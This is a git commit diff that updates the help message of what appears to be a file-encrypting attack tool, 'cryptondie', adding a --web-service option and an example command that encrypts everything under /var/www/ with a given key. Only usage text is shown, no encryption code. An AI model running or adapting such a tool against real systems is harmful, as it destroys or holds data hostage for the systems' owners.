0d5a36c2f82e8299ba699729dae2a4c495ab0a62
gmdutra <gmdutra.eu@gmail.com>
2019-09-21 21:43:10 -0300

    Update help message

--- modules/info.py
+++ modules/info.py
@@ -30,14 +30,16 @@ Blog:   https://zer0dx.github.io
     sleep(3)
 
 help_message = '''
-    --key       key used to encrypt and decrypt files
-    --dir       Home directory for the attack, default is /
-    --encrypt   Encrypt all files
-    --decrypt   Decrypt all files
-    --verbose   Active verbose mode, default is False
+
+    --key           key used to encrypt and decrypt files
+    --dir           Home directory for the attack, default is /
+    --encrypt       Encrypt all files
+    --decrypt       Decrypt all files
+    --verbose       Active verbose mode, default is False
+    --web-service   web service URL
 
 Example:
-    python3 cryptondie.py --dir /var/www/ --key 0123456789abcdef --encrypt --verbose
+    python3 cryptondie.py --web-service http://127.0.0.1:5000 --dir /var/www/ --key 0123456789abcdef --encrypt --verbose
     '''
 
 def log(msg):
